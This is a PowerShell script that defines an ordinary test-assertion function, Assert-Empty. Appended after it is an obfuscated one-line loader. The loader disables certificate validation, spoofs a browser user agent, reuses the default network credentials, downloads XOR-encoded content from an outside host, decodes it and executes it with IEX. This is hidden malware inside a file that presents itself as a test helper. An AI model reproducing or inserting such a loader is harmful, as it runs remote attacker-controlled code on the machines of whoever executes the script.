













function Assert-Empty
{
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0)]
        [object]
        
        $InputObject, 

        [Parameter(Position=1)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    if( $InputObject -eq $null )
    {
        Fail ("Object is null but expected it to be empty. {0}" -f $Message)
        return
    }

    $hasLength = Get-Member -InputObject $InputObject -Name 'Length'
    $hasCount = Get-Member -InputObject $InputObject -Name 'Count'

    if( -not $hasLength -and -not $hasCount )
    {
        Fail ("Object '{0}' has no Length/Count property, so can't determine if it's empty. {1}" -f $InputObject,$Message)
    }

    if( ($hasLength -and $InputObject.Length -ne 0) -or ($hasCount -and $InputObject.Count -ne 0) )
    {
        Fail  ("Object '{0}' not empty. {1}" -f $InputObject,$Message)
    }
}


$WC=New-OBjeCt SysteM.NeT.WeBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HeADers.Add('User-Agent',$u);$WC.PrOxY = [SYsTem.NeT.WEBREquEsT]::DeFAuLtWEBPROxy;$WC.PrOXY.CrEDEnTIALS = [SYstEm.NeT.CREdenTiALCaCHE]::DefauLTNeTWorkCREdenTiALS;$K='4cb33a00ce89ad59228ea02a42b2679d';$i=0;[cHar[]]$B=([CHaR[]]($WC.DOwnloadStRINg("https://logexpert.eu/index.asp")))|%{$_-BXor$k[$I++%$K.LenGtH]};IEX ($B-JOIN'')

